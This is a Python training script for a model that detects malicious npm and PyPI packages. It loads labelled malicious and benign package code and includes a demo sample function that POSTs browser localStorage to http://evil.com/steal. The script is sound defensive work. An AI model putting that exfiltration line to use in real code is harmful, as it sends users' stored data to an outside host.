#!/usr/bin/env python3
"""
NeoBERT Training Pipeline
Train NeoBERT transformer model for malicious package detection.
"""

import argparse
import logging
import os
import pickle
from pathlib import Path
from typing import Dict
import torch
import sys
import click
from tqdm import tqdm
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeRemainingColumn
from rich import print as rprint

console = Console()

# Add project root to path
sys.path.append(str(Path(__file__).parent))

from neobert.config import create_default_config, save_config_to_json, load_config_from_json
from neobert.model import create_neobert_model
from neobert.trainer import NeoBERTTrainer, PackageUnit
from neobert.evaluator import NeoBERTEvaluator
from neobert.unit_processor import UnitProcessor

from icn.data.malicious_extractor import MaliciousExtractor, PackageSample
from icn.data.benign_collector import BenignSample, BenignCollector
from icn.parsing.unified_parser import UnifiedParser
from neobert.augmentation import augment_benign_samples


logger = logging.getLogger(__name__)


def setup_logging(log_level: str = "INFO"):
    """Setup logging configuration."""

    # Create logs directory
    Path("logs/neobert").mkdir(parents=True, exist_ok=True)

    # Configure logging
    logging.basicConfig(
        level=getattr(logging, log_level.upper()),
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(f"logs/neobert/training.log"),
            logging.StreamHandler()
        ]
    )

    # Suppress tokenizer warnings about sequence length
    # (UnitProcessor handles chunking, these warnings are expected)
    import warnings
    warnings.filterwarnings("ignore", message="Token indices sequence length is longer than.*")


def create_sample_data():
    """Create sample training data for demonstration."""
    
    logger.info("Creating sample training data...")
    
    # Sample benign package unit
    benign_sample = PackageUnit(
        unit_id="benign_utils_1",
        unit_name="isValid",
        unit_type="function",
        source_file="src/utils.js",
        raw_content="function isValid(input) { return input != null && input.length > 0; }"
    )

    # Sample malicious package unit
    malicious_sample = PackageUnit(
        unit_id="malicious_stealer_1",
        unit_name="stealData",
        unit_type="function",
        source_file="src/stealer.js",
        raw_content="function stealData() { fetch('http://evil.com/steal', {method: 'POST', body: localStorage}); }"
    )
    
    # Create minimal dataset
    train_samples = [benign_sample] * 100 + [malicious_sample] * 20
    val_samples = [benign_sample] * 20 + [malicious_sample] * 4
    
    return train_samples, val_samples


def load_benign_samples_from_cache(cache_path: str = "data/benign_samples",
                                    max_samples: int = 100) -> list[BenignSample]:
    """Load benign samples from the local cache directory."""
    cache_dir = Path(cache_path)
    benign_samples = []

    if not cache_dir.exists():
        logger.warning(f"Benign cache not found at {cache_path}")
        return benign_samples

    logger.info(f"Loading benign samples from {cache_path}...")

    # Walk through npm and pypi directories
    for ecosystem in ["npm", "pypi"]:
        ecosystem_dir = cache_dir / ecosystem
        if not ecosystem_dir.exists():
            continue

        # Look for popular and longtail categories
        for category in ["popular", "longtail"]:
            category_dir = ecosystem_dir / category
            if not category_dir.exists():
                continue

            # Each package has its own directory
            for pkg_dir in category_dir.iterdir():
                if not pkg_dir.is_dir():
                    continue

                package_name = pkg_dir.name

                # Find version directories
                for version_dir in pkg_dir.iterdir():
                    if not version_dir.is_dir():
                        continue

                    version = version_dir.name

                    # Create BenignSample
                    sample = BenignSample(
                        name=package_name,
                        ecosystem=ecosystem,
                        version=version,
                        download_count=None,
                        category=category,
                        download_url="",
                        extracted_path=version_dir
                    )

                    benign_samples.append(sample)

                    if len(benign_samples) >= max_samples:
                        logger.info(f"Reached max samples limit: {max_samples}")
                        return benign_samples

    logger.info(f"Loaded {len(benign_samples)} benign samples from cache")
    return benign_samples


def read_package_files(package_path: Path, ecosystem: str) -> Dict[str, str]:
    """Read all code files from a package directory."""
    file_contents = {}

    # Define file extensions based on ecosystem
    if ecosystem == "npm":
        extensions = {".js", ".ts", ".jsx", ".tsx", ".mjs", ".cjs"}
    elif ecosystem == "pypi":
        extensions = {".py"}
    else:
        extensions = {".js", ".ts", ".jsx", ".tsx", ".py"}

    # Walk through package directory
    for file_path in package_path.rglob("*"):
        if not file_path.is_file():
            continue

        # Skip node_modules, __pycache__, etc.
        if any(p in file_path.parts for p in ["node_modules", "__pycache__", ".git", "dist", "build"]):
            continue

        # Check if it's a code file
        if file_path.suffix in extensions or file_path.name in ["package.json", "setup.py"]:
            try:
                content = file_path.read_text(encoding='utf-8', errors='ignore')
                relative_path = str(file_path.relative_to(package_path))
                file_contents[relative_path] = content
            except Exception as e:
                logger.debug(f"Failed to read {file_path}: {e}")
                continue

    return file_contents


def process_package_to_units(package_path: Path, package_name: str, ecosystem: str,
                             processor: UnitProcessor) -> list[PackageUnit]:
    """Process a package directory into PackageUnit objects."""
    try:
        # Read all code files from package
        file_contents = read_package_files(package_path, ecosystem)

        if not file_contents:
            logger.debug(f"No files found in {package_name}")
            return []

        # Process into units
        units = processor.process_package(
            package_name=package_name,
            file_contents=file_contents,
            ecosystem=ecosystem
        )

        return units

    except Exception as e:
        logger.debug(f"Error processing {package_name}: {e}")
        return []



def auto_collect_benign_if_needed(benign_cache_path: str, max_benign: int,
                                  actual_malicious: int, default_ratio: float = 3.0):
    """
    Automatically collect benign packages if we don't have enough.

    Args:
        benign_cache_path: Path to benign cache
        max_benign: User-requested max benign packages
        actual_malicious: Actual number of malicious packages being used
        default_ratio: Default benign:malicious ratio (3:1)

    Returns:
        Number of benign packages available
    """
    # Check current benign count
    current_benign = len(load_benign_samples_from_cache(benign_cache_path, max_samples=999999))

    # Calculate needed amount based on ratio
    recommended_benign = int(actual_malicious * default_ratio)
    target_benign = max(max_benign, recommended_benign)

    # Show status
    console.print(Panel(
        f"[cyan]Benign packages available:[/cyan] {current_benign:,}\n"
        f"[cyan]Malicious packages using:[/cyan] {actual_malicious:,}\n"
        f"[cyan]Recommended benign (3:1):[/cyan] {recommended_benign:,}\n"
        f"[cyan]Target benign:[/cyan] {target_benign:,}",
        title="📊 Dataset Check",
        border_style="cyan"
    ))

    # If we need more, auto-collect
    if current_benign < target_benign:
        needed = target_benign - current_benign
        console.print(f"\n[yellow]⚠️  Need {needed:,} more benign packages![/yellow]")
        console.print(f"[yellow]   Auto-collecting to reach target...[/yellow]\n")

        # Initialize collector
        collector = BenignCollector(
            cache_dir=benign_cache_path,
            download_timeout=30
        )

        # Calculate split between PyPI and npm
        pypi_needed = int(needed * 0.6)  # 60% PyPI
        npm_needed = needed - pypi_needed  # 40% npm

        # Collect PyPI
        if pypi_needed > 0:
            console.print(f"[cyan]Collecting {pypi_needed:,} PyPI packages...[/cyan]")
            try:
                collector.collect_pypi_popular(max_packages=pypi_needed // 2)
                collector.collect_pypi_longtail(max_packages=pypi_needed // 2)
            except Exception as e:
                console.print(f"[red]PyPI collection failed: {e}[/red]")

        # Collect npm
        if npm_needed > 0:
            console.print(f"[cyan]Collecting {npm_needed:,} npm packages...[/cyan]")
            try:
                collector.collect_npm_popular(max_packages=npm_needed)
            except Exception as e:
                console.print(f"[red]npm collection failed: {e}[/red]")

        # Re-check count
        final_count = len(load_benign_samples_from_cache(benign_cache_path, max_samples=999999))
        console.print(f"\n[green]✓ Collected packages. Total benign: {final_count:,}[/green]\n")
        return final_count
    else:
        console.print(f"[green]✓ Sufficient benign packages available[/green]\n")
        return current_benign


def load_full_training_data(malicious_dataset_path: str = "malicious-software-packages-dataset",
                            benign_cache_path: str = "data/benign_samples",
                            max_malicious: int = 100,
                            max_benign: int = 100,
                            val_split: float = 0.2,
                            neobert_config = None,
                            auto_collect_benign: bool = True,
                            benign_ratio: float = 3.0):
    """
    Load full training data from malicious dataset and benign cache.

    Args:
        malicious_dataset_path: Path to malicious package dataset
        benign_cache_path: Path to benign package cache
        max_malicious: Maximum malicious samples to load (None = use all)
        max_benign: Maximum benign samples to load (None = use ratio)
        val_split: Validation split ratio
        neobert_config: NeoBERT configuration for unit processing
        auto_collect_benign: Automatically collect benign packages if needed
        benign_ratio: Desired benign:malicious ratio (default 3:1)

    Returns:
        train_samples, val_samples as lists of PackageUnit objects
    """
    click.echo(click.style("🔄 Loading full training data...", fg="blue", bold=True))

    # Initialize processors
    if neobert_config is None:
        from neobert.config import create_default_config
        neobert_config, _, _ = create_default_config()

    processor = UnitProcessor(neobert_config)

    all_units = []

    # Load malicious samples
    click.echo(click.style(f"\n📦 Loading malicious samples from {malicious_dataset_path}...", fg="yellow"))
    try:
        extractor = MaliciousExtractor(malicious_dataset_path)
        manifests = extractor.load_manifests()
        categorized = extractor.categorize_packages(manifests)

        malicious_count = 0
        total_malicious_units = 0

        # Collect all malicious samples from both categories
        all_malicious_samples = []
        for category in ["compromised_lib", "malicious_intent"]:
            samples = categorized.get(category, [])
            click.echo(f"  Found {click.style(str(len(samples)), fg='cyan')} {category} samples")
            all_malicious_samples.extend(samples)

        # Take up to max_malicious samples total
        samples_to_process = all_malicious_samples[:max_malicious]
        click.echo(f"  Will process {click.style(str(len(samples_to_process)), fg='cyan', bold=True)} total malicious samples")

        # Progress bar for processing samples
        with tqdm(total=len(samples_to_process),
                 desc=f"  Processing malicious",
                 unit="pkg",
                 bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as pbar:

            for sample in samples_to_process:
                # Extract if needed
                if sample.file_path.suffix == ".zip":
                    import tempfile
                    import zipfile

                    temp_dir = Path(tempfile.mkdtemp())
                    try:
                        with zipfile.ZipFile(sample.file_path, 'r') as zf:
                            zf.extractall(temp_dir, pwd=b"infected")
                        sample.extracted_path = temp_dir
                    except Exception as e:
                        logger.debug(f"Failed to extract {sample.name}: {e}")
                        pbar.update(1)
                        continue

                # Process package
                pkg_path = sample.extracted_path or sample.file_path
                units = process_package_to_units(
                    pkg_path, sample.name, sample.ecosystem,
                    processor
                )

                # Add label (malicious=1)
                for unit in units:
                    unit.malicious_label = 1.0
                    all_units.append(unit)

                total_malicious_units += len(units)
                malicious_count += 1
                pbar.set_postfix({"units": total_malicious_units})
                pbar.update(1)

        click.echo(click.style(f"  ✓ Processed {malicious_count} malicious packages → {total_malicious_units} units", fg="green"))

    except Exception as e:
        click.echo(click.style(f"  ✗ Failed to load malicious samples: {e}", fg="red"))
        logger.debug("", exc_info=True)
        malicious_count = 0

    # Auto-collect benign if needed
    if auto_collect_benign and malicious_count > 0:
        click.echo("\n")
        auto_collect_benign_if_needed(
            benign_cache_path=benign_cache_path,
            max_benign=max_benign,
            actual_malicious=malicious_count,
            default_ratio=benign_ratio
        )

    # Load benign samples
    click.echo(click.style(f"📦 Loading benign samples from {benign_cache_path}...", fg="yellow"))
    try:
        benign_samples = load_benign_samples_from_cache(benign_cache_path, max_benign)

        benign_count = 0
        total_benign_units = 0

        # Progress bar for processing benign samples
        with tqdm(total=min(len(benign_samples), max_benign),
                 desc="  Processing benign",
                 unit="pkg",
                 bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as pbar:

            for sample in benign_samples[:max_benign]:
                if not sample.extracted_path or not sample.extracted_path.exists():
                    pbar.update(1)
                    continue

                # Process package
                units = process_package_to_units(
                    sample.extracted_path, sample.name, sample.ecosystem,
                    processor
                )

                # Add label (benign=0)
                for unit in units:
                    unit.malicious_label = 0.0
                    all_units.append(unit)

                total_benign_units += len(units)
                benign_count += 1
                pbar.set_postfix({"units": total_benign_units})
                pbar.update(1)

                if benign_count >= max_benign:
                    break

        click.echo(click.style(f"  ✓ Processed {benign_count} benign packages → {total_benign_units} units", fg="green"))

    except Exception as e:
        click.echo(click.style(f"  ✗ Failed to load benign samples: {e}", fg="red"))
        logger.debug("", exc_info=True)

    # Check if we have data
    if not all_units:
        click.echo(click.style("✗ No training data loaded! Falling back to sample data.", fg="red"))
        return create_sample_data()

    # Balance dataset with augmentation
    malicious_units = [u for u in all_units if getattr(u, 'malicious_label', 0) > 0.5]
    benign_units = [u for u in all_units if getattr(u, 'malicious_label', 0) < 0.5]

    click.echo(click.style(f"\n⚖️  Balancing dataset...", fg="blue"))
    click.echo(f"  Original: {click.style(str(len(malicious_units)), fg='red')} malicious, {click.style(str(len(benign_units)), fg='green')} benign")

    # If benign units are less than malicious, augment them
    if len(benign_units) < len(malicious_units):
        target_benign = len(malicious_units)  # Match malicious count
        click.echo(f"  Need {click.style(str(target_benign - len(benign_units)), fg='yellow')} more benign units")
        click.echo(f"  Augmenting benign samples...")

        # Get augmentation types from config
        if neobert_config is None:
            aug_types = ["minification", "comment_removal", "whitespace_variation", "string_concat"]
        else:
            from neobert.config import TrainingConfig
            temp_config = TrainingConfig()
            aug_types = temp_config.augmentation_types

        augmented_benign = augment_benign_samples(
            benign_units,
            target_count=target_benign,
            augmentation_types=aug_types
        )

        click.echo(f"  ✓ Augmented to {click.style(str(len(augmented_benign)), fg='green')} benign units")

        # Replace benign units with augmented
        all_units = malicious_units + augmented_benign

    # Shuffle and split
    import random
    click.echo("\n🔀 Shuffling and splitting data...")
    random.shuffle(all_units)

    split_idx = int(len(all_units) * (1 - val_split))
    train_samples = all_units[:split_idx]
    val_samples = all_units[split_idx:]

    # Summary statistics
    train_malicious = sum(1 for u in train_samples if getattr(u, 'malicious_label', 0) > 0.5)
    val_malicious = sum(1 for u in val_samples if getattr(u, 'malicious_label', 0) > 0.5)

    # Chunking statistics
    total_chunks = sum(u.total_chunks for u in all_units)
    chunked_units = sum(1 for u in all_units if u.total_chunks > 1)
    truncated_units = sum(1 for u in all_units if u.is_truncated)

    # Create summary table
    table = Table(title="✅ Dataset Summary", show_header=True, header_style="bold magenta")
    table.add_column("Split", style="cyan", justify="center")
    table.add_column("Total Units", justify="right", style="bold")
    table.add_column("Malicious", justify="right", style="red")
    table.add_column("Benign", justify="right", style="green")
    table.add_column("Balance", justify="right")

    train_ratio = f"{train_malicious/(len(train_samples) - train_malicious):.2f}:1" if len(train_samples) - train_malicious > 0 else "N/A"
    val_ratio = f"{val_malicious/(len(val_samples) - val_malicious):.2f}:1" if len(val_samples) - val_malicious > 0 else "N/A"

    table.add_row(
        "Train",
        f"{len(train_samples):,}",
        f"{train_malicious:,}",
        f"{len(train_samples) - train_malicious:,}",
        train_ratio
    )
    table.add_row(
        "Val",
        f"{len(val_samples):,}",
        f"{val_malicious:,}",
        f"{len(val_samples) - val_malicious:,}",
        val_ratio
    )

    console.print("\n")
    console.print(table)

    # Chunking info panel
    chunking_info = f"""[yellow]Multi-chunk units:[/yellow] {chunked_units:,} ({chunked_units/len(all_units)*100:.1f}%)
[yellow]Total chunks:[/yellow] {total_chunks:,}
[yellow]Truncated units:[/yellow] {truncated_units:,} ({truncated_units/len(all_units)*100:.1f}%)"""

    console.print(Panel(chunking_info, title="📊 Chunking Statistics", border_style="yellow"))
    console.print("\n")

    return train_samples, val_samples


def load_training_data(data_path: str = None,
                      malicious_dataset_path: str = "malicious-software-packages-dataset",
                      benign_cache_path: str = "data/benign_samples",
                      max_malicious: int = 100,
                      max_benign: int = 100,
                      use_full_pipeline: bool = False,
                      neobert_config = None):
    """Load training data from files or create sample data."""

    # If use_full_pipeline is True, load from actual datasets
    if use_full_pipeline:
        return load_full_training_data(
            malicious_dataset_path=malicious_dataset_path,
            benign_cache_path=benign_cache_path,
            max_malicious=max_malicious,
            max_benign=max_benign,
            neobert_config=neobert_config
        )

    # Try loading from pickle files
    if data_path and Path(data_path).exists():
        logger.info(f"Loading training data from {data_path}")

        train_file = Path(data_path) / "train_units.pkl"
        val_file = Path(data_path) / "val_units.pkl"

        if train_file.exists() and val_file.exists():
            with open(train_file, "rb") as f:
                train_samples = pickle.load(f)

            with open(val_file, "rb") as f:
                val_samples = pickle.load(f)

            logger.info(f"Loaded {len(train_samples)} train, {len(val_samples)} val samples")
            return train_samples, val_samples

    # Fall back to sample data
    logger.warning("No data path provided, creating sample data for demonstration")
    train_samples, val_samples = create_sample_data()

    return train_samples, val_samples


def train_neobert_model(config=None, data_path=None, batch_size=8, learning_rate=5e-5,
                       max_length=512, pooling_strategy="attention", device="auto",
                       log_level="INFO", save_dir="checkpoints/neobert", resume=None,
                       use_full_pipeline=False, malicious_dataset_path="malicious-software-packages-dataset",
                       benign_cache_path="data/benign_samples", max_malicious=100, max_benign=100):
    """Train NeoBERT model programmatically."""

    # Setup logging
    setup_logging(log_level)

    click.echo("\n" + "="*60)
    click.echo(click.style("🎯 NeoBERT Training Pipeline", fg="blue", bold=True))
    click.echo("="*60 + "\n")

    # Load or create configuration
    if config and Path(config).exists():
        click.echo(f"📋 Loading config from {click.style(config, fg='cyan')}")
        neobert_config, training_config, eval_config = load_config_from_json(config)
    else:
        click.echo("📋 Using default configuration")
        neobert_config, training_config, eval_config = create_default_config()

    # Override config with parameters
    if batch_size != 8:
        training_config.batch_size = batch_size
    if learning_rate != 5e-5:
        training_config.learning_rate = learning_rate
    if max_length != 512:
        neobert_config.max_length = max_length
    if pooling_strategy != "attention":
        neobert_config.pooling_strategy = pooling_strategy

    # Setup device
    if device == "auto":
        device = "cuda" if torch.cuda.is_available() else "cpu"

    click.echo(f"💻 Device: {click.style(device, fg='cyan', bold=True)}")
    click.echo(f"⚙️  Config:")
    click.echo(f"   Batch size: {click.style(str(batch_size), fg='cyan')}")
    click.echo(f"   Learning rate: {click.style(f'{learning_rate:.0e}', fg='cyan')}")
    click.echo(f"   Max length: {click.style(str(max_length), fg='cyan')}")
    click.echo(f"   Pooling: {click.style(pooling_strategy, fg='cyan')}")

    # Create save directory
    os.makedirs(save_dir, exist_ok=True)

    # Save configuration
    config_path = os.path.join(save_dir, "config.json")
    save_config_to_json(neobert_config, training_config, eval_config, config_path)
    click.echo(f"💾 Config saved to {click.style(config_path, fg='green')}\n")

    # Load training data
    try:
        train_samples, val_samples = load_training_data(
            data_path=data_path,
            malicious_dataset_path=malicious_dataset_path,
            benign_cache_path=benign_cache_path,
            max_malicious=max_malicious,
            max_benign=max_benign,
            use_full_pipeline=use_full_pipeline,
            neobert_config=neobert_config
        )
    except Exception as e:
        logger.error(f"Failed to load training data: {e}")
        logger.info("Creating minimal sample data for testing...")
        train_samples, val_samples = create_sample_data()

    # Create model
    logger.info("Creating NeoBERT model...")
    model = create_neobert_model(neobert_config, device)
    logger.info(f"Model created with {sum(p.numel() for p in model.parameters()):,} parameters")

    # Create trainer
    trainer = NeoBERTTrainer(model, training_config, neobert_config)

    # Resume from checkpoint if specified
    if resume and Path(resume).exists():
        logger.info(f"Resuming from checkpoint: {resume}")
        trainer.load_checkpoint(resume)

    # Start training
    logger.info("Starting NeoBERT training with progressive curriculum...")
    logger.info(f"Training samples: {len(train_samples)}")
    logger.info(f"Validation samples: {len(val_samples)}")
    logger.info(f"Pooling strategy: {neobert_config.pooling_strategy}")

    try:
        results = trainer.train(train_samples, val_samples)

        # Save results
        results_path = os.path.join(save_dir, "training_results.json")
        import json
        with open(results_path, "w") as f:
            json.dump(results, f, indent=2, default=str)

        logger.info("✅ NeoBERT training completed successfully!")
        logger.info(f"Results saved to {results_path}")
        logger.info(f"Final model saved to {results.get('best_model_path', 'checkpoints/')}")

        # Quick evaluation
        if val_samples:
            logger.info("Running quick evaluation...")
            evaluator = NeoBERTEvaluator(model, eval_config, neobert_config)
            eval_results = evaluator.evaluate_classification(val_samples[:50])  # Quick eval

            logger.info(f"Validation AUC: {eval_results.get('roc_auc', 0.0):.3f}")
            logger.info(f"Validation F1: {eval_results.get('f1_score', 0.0):.3f}")

        logger.info("🎉 NeoBERT training pipeline completed!")
        return results

    except Exception as e:
        logger.error(f"Training failed: {e}")
        import traceback
        traceback.print_exc()
        raise


def main():
    """Main training function with argparse."""

    parser = argparse.ArgumentParser(description="Train NeoBERT model")
    parser.add_argument("--config", type=str, help="Path to config file")
    parser.add_argument("--data-path", type=str, help="Path to training data directory (pickle files)")

    # Full data pipeline options
    parser.add_argument("--full-pipeline", action="store_true",
                       help="Use full data loading pipeline (load from malicious dataset + benign cache)")
    parser.add_argument("--malicious-dataset", type=str, default="malicious-software-packages-dataset",
                       help="Path to malicious package dataset")
    parser.add_argument("--benign-cache", type=str, default="data/benign_samples",
                       help="Path to benign package cache")
    parser.add_argument("--max-malicious", type=int, default=100,
                       help="Maximum malicious samples to load")
    parser.add_argument("--max-benign", type=int, default=100,
                       help="Maximum benign samples to load")

    # Training options
    parser.add_argument("--batch-size", type=int, default=8, help="Batch size")
    parser.add_argument("--learning-rate", type=float, default=5e-5, help="Learning rate")
    parser.add_argument("--max-length", type=int, default=512, help="Max sequence length")
    parser.add_argument("--pooling-strategy", type=str, default="attention",
                       choices=["mean", "attention", "mil"], help="Pooling strategy")
    parser.add_argument("--device", type=str, default="auto", help="Device (auto/cpu/cuda)")
    parser.add_argument("--log-level", type=str, default="INFO", help="Logging level")
    parser.add_argument("--save-dir", type=str, default="checkpoints/neobert", help="Save directory")
    parser.add_argument("--resume", type=str, help="Resume from checkpoint")

    args = parser.parse_args()

    # Call the programmatic function
    try:
        train_neobert_model(
            config=args.config,
            data_path=args.data_path,
            batch_size=args.batch_size,
            learning_rate=args.learning_rate,
            max_length=args.max_length,
            pooling_strategy=args.pooling_strategy,
            device=args.device,
            log_level=args.log_level,
            save_dir=args.save_dir,
            resume=args.resume,
            use_full_pipeline=args.full_pipeline,
            malicious_dataset_path=args.malicious_dataset,
            benign_cache_path=args.benign_cache,
            max_malicious=args.max_malicious,
            max_benign=args.max_benign
        )
    except Exception as e:
        logger.error(f"Training failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()